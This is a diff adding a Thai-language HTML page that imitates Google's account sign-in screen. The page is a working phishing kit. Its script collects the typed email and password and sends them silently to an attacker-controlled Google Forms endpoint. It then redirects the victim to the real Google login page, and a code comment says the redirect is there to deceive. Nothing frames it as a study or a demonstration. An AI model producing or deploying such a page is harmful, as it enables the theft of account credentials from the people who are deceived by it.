@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <title>ลงชื่อเข้าใช้งาน - บัญชี Google</title>
+    <style>
+        body { font-family: arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: white; }
+        .box { border: 1px solid #dadce0; border-radius: 8px; padding: 40px 33px; width: 360px; text-align: center; }
+        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+        <h2>ลงชื่อเข้าใช้งาน</h2>
+        <p>ใช้บัญชี Google ของคุณ</p>
+        <input type="email" id="email" placeholder="อีเมลหรือโทรศัพท์">
+        <input type="password" id="pass" placeholder="ป้อนรหัสผ่านของคุณ">
+        <div style="text-align:left; color:#1a73e8; font-size:14px; margin-top:10px;">หากลืมอีเมล?</div>
+        <div style="margin-top: 40px;">
+            <button onclick="sendData()">ถัดไป</button>
+        </div>
+    </div>
+
+    <script>
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            // ตรวจสอบว่ากรอกข้อมูลหรือยัง
+            if(!email || !pass) { alert("กรุณากรอกข้อมูลให้ครบ"); return; }
+
+            const url = "https://docs.google.com/forms/d/e/1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q/formResponse";
+            const p = new URLSearchParams();
+            p.append('entry.1449652638', email);
+            p.append('entry.270012312', pass);
+
+            try {
+                await fetch(url, { method: 'POST', mode: 'no-cors', body: p });
+                // ส่งเสร็จแล้วหลอกให้ไปหน้าเว็บจริง
+                window.location.href = "https://accounts.google.com/ServiceLogin";
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+</body>
+</html>
